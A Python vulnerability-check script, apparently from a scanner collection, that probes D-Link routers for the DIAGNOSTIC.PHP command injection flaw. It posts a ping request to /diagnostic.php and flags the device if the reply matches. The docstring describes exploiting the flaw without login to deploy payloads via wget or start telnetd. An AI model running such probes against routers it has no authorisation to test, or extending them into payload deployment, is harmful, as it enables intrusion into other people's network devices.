#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Dlink DIAGNOSTIC.PHP命令执行
referer: https://www.exploit-db.com/exploits/24956
author: Lucifer
description: Some D-Link Routers are vulnerable to OS Command injection in the web interface. 
On DIR-645 versions prior 1.03 authentication isn't needed to exploit it. On version 1.03 authentication is needed in order to trigger the vulnerability, 
which has been fixed definitely on version 1.04. Other D-Link products, like DIR-300 rev B and DIR-600, are also affected by this vulnerability. 
Not every device includes wget which we need for deploying our payload. On such devices you could use the cmd generic payload and try to start telnetd or execute other commands. 
Since it is a blind OS command injection vulnerability, there is no output for the executed command when using the cmd generic payload. A ping command against a controlled system could be used for testing purposes. 
This module has been tested successfully on DIR-645 prior to 1.03, where authentication isn't needed in order to exploit the vulnerability.
'''
import sys
import json
import requests


class router_dlink_command_exec_BaseVerify():
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
        }
        post_data = {
            "act":"ping",
            "dst":"www.baidu.com"
        }
        payload = "/diagnostic.php"
        vulnurl = self.url + payload
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"<report>OK" in req.text:
                return "[+]存在Dlink DIAGNOSTIC.PHP命令执行漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)
            else:
                return "[-]no vuln"
        except:
            return "[-] ======>连接超时"

if __name__ == "__main__":
    testVuln = router_dlink_command_exec_BaseVerify(sys.argv[1])
    testVuln.run()